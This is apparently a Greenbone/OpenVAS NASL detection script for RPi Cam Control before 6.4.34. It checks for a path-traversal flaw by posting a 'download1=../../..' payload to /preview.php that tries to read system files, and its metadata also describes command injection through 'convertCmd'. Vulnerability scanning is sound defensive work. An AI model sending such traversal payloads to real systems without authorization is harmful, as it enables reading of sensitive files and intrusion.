CPE = "cpe:/a:rpi:cam_control";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.812362" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2017-12-26 14:19:48 +0530 (Tue, 26 Dec 2017)" );
	script_name( "RPi Cam Control Multiple Vulnerabilities" );
	script_tag( name: "summary", value: "The host is running RPi Cam Control
  and is prone to multiple vulnerabilities" );
	script_tag( name: "vuldetect", value: "Sends the crafted http POST request
  and checks whether it is able to read the file or not." );
	script_tag( name: "insight", value: "Multiple flaws exist due to multiple improper
  sanitization of input passed to 'download1' and 'convertCmd' parameters in
  '/preview.php' script." );
	script_tag( name: "impact", value: "Successful exploitation will allow a remote
  attacker to read arbitrary files and also execute arbitrary commands on the
  affected system." );
	script_tag( name: "affected", value: "RPi Cam Control versions before 6.4.34." );
	script_tag( name: "solution", value: "Update to version 6.4.34 or later." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_xref( name: "URL", value: "https://www.exploit-db.com/exploits/42638" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2017 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_rpi_cam_control_detect.sc", "os_detection.sc" );
	script_mandatory_keys( "RPi/Cam/Control/Installed" );
	script_require_ports( "Services/www", 80 );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
if(!ripPort = get_app_port( cpe: CPE )){
	exit( 0 );
}
files = traversal_files( "linux" );
for pattern in keys( files ) {
	file = files[pattern];
	postData = "download1=../../../../../../../../../../../../../../../../" + file + ".v0000.t";
	req = http_post_put_req( port: ripPort, url: "/preview.php", data: postData, add_headers: make_array( "Content-Type", "application/x-www-form-urlencoded" ) );
	res = http_keepalive_send_recv( port: ripPort, data: req );
	if(IsMatchRegexp( res, "HTTP/1.. 200 OK" ) && egrep( string: res, pattern: pattern )){
		report = http_report_vuln_url( port: ripPort, url: "/preview.php" );
		security_message( port: ripPort, data: report );
		exit( 0 );
	}
}
exit( 99 );

